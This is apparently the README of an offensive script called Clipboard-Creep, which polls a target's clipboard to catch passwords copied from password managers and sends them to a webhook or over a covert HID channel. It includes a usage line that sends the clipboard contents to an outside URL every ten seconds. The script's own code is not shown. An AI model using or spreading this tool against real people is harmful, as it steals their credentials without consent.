# Clipboard-Creep #
Clipboard-Creep is a basic script which tracks the users clipboard and exfiltrates it contents. It was created to get access to passwords copied out of password managers, but might be useful in general.


## Usage ##
### Webhook ###
The paramter webhook where data gets send to. Define the URL simply after the paramter and get the incoming clipboard content.

### CovertExfil ###
This method required an HIDX poc to be successfully imported on the system. In addition to that, an OMG Elite device with actived HIDX is required. (This method is seen as a work in progress POC)

### Sleep ###
The paramter sleep defines delay between every observation of the targets clipboard. A default of 12 seconds was choosen to capture potential passwords, in clipboards of password managers.

### EXAMPLE ###
Output the targets clipboard into the console, every 12 seconds.
```Clipboard-Creep```

### EXAMPLE ###
Exfiltrate the targets clipboard content to a defined webhook every 10 seconds.
```Clipboard-Creep -Webhook "https://example.com/" -Sleep 10```

![alt text](https://github.com/0i41E/ClipBoard-Creep/blob/main/ClipBoard-Creep/media/clippy.png)
